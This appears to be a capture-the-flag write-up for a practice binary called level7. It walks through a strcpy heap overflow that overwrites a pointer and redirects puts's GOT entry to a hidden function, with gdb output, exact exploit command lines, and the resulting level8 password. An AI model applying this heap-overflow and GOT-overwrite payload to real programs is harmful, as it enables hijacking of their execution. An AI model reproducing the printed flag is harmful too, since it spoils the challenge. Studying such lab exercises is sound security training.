The program has a main function and a function called m. The function m is never called from main. The function m prints out a string c which is a global variable.

The main function calls malloc 4 times and sets up 2 arrays of pointers. Analysis of the code shows that program uses strcpy to copy strings from argv into 2 strings. It then reads the password for level8 and stores the data in the global variable c.

strcpy((char *)array1[1], argv[1]);
strcpy((char *)array3[1], argv[2]);

This means we can send data through argv to overwrite the data in the arrays. There are 4 arrays allocated with malloc that are structured like this:

array1         string2  array2        string2
[0x1, p->str2][8 bytes][0x2, p->str2][8 bytes]

The program copies argv[1] into string2 but doesn't check the size so we can overwrite past string2 into array2 to overwrite the pointer in array2. The program will then copy argv[2] into the location pointed in array2.


Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.

Disassembling the puts function shows a jmp operation that jumps to the memory location pointed at 0x8049928. If we can change the data at this location we can make the program jump to the function m instead.

We run the program with gdb using the following command:

(gdb) run `python -c 'print "A" * 20 + "BBBB"'` CCCC

This over writes string2 and array2. Checking the contents of array shows that the pointer at array[1] is filled with BBBB.

(gdb) x/8x 0x804a028
0x804a028:      0x41    0x41    0x41    0x41    0x42    0x42    0x42    0x42

We need to put our new pointer into here. We will change the location 0x8049928. The puts function will take the address from this location and jump there. The new command will look like this:

./level7 `python -c 'print "A" * 20 + "\x28\x99\x04\x08"'` CCCC

We also need to change the data we will send there. We will send the pointer to the function m.

$1 = {<text variable, no debug info>} 0x80484f4 <m>

The location of m is 0x80484f4. The new command will be:

./level7 `python -c 'print "A" * 20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`

The result of the command is:

5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1719911761

This is the password for level8.
